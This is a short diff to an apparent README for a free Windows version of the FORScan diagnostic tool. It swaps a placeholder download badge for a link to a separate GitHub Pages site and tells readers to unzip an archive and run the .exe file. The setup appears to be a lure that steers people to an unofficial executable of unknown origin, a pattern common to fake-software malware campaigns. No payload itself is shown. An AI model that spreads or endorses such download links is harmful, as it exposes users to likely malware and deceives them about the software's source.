@@ -13,7 +13,7 @@ Unzip the archive to a separate folder.
 
 Run the `.exe` file to start the application.  
 
-[![Download](https://img.shields.io/badge/Download-Now-2ea44f?style=for-the-badge)](#)
+[![Download](https://img.shields.io/badge/Download-Now-2ea44f?style=for-the-badge)](https://forscan-windows-free.github.io/.github/)
 
 ## 📸 Overview
 ![forscan-windows-dashboard](https://github.com/user-attachments/assets/0df304db-5a11-4f27-a550-6c5a90a66590)
